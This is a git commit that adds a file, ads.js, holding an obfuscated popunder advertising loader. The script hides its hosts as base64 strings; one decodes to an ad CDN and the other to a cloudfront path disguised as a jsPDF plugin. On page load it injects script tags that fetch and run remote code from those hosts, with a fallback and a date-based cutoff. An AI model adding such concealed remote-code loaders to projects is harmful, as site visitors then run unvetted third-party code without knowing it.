af3cf16ed77c96c5b7b9d29a6f01792ebf55f628
Jessiemove25 <jessievincoy1@gmail.com>
2025-02-16 20:31:37 +0800

    ads.js

---
+++ ads.js
@@ -0,0 +1,5 @@
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var w=window,y="cb5dec3dba61db02be2d1b3bc5ce6136",x=[["siteId",461-95-215+5175221],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],l=["d3d3LmNkbjRhZHMuY29tL2dwaGVyeS5taW4uY3Nz","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvdkpOSkpkL2dqc3BkZi5wbHVnaW4uYXV0b3RhYmxlLm1pbi5qcw=="],i=-1,z,r,a=function(){clearTimeout(r);i++;if(l[i]&&!(1765628969000<(new Date).getTime()&&1<i)){z=w.document.createElement("script");z.type="text/javascript";z.async=!0;var p=w.document.getElementsByTagName("script")[0];z.src="https://"+atob(l[i]);z.crossOrigin="anonymous";z.onerror=a;z.onload=function(){clearTimeout(r);w[y.slice(0,16)+y.slice(0,16)]||a()};r=setTimeout(a,5E3);p.parentNode.insertBefore(z,p)}};if(!w[y]){try{Object.freeze(w[y]=x)}catch(e){}a()}})();
+/*]]>/* */
+</script>
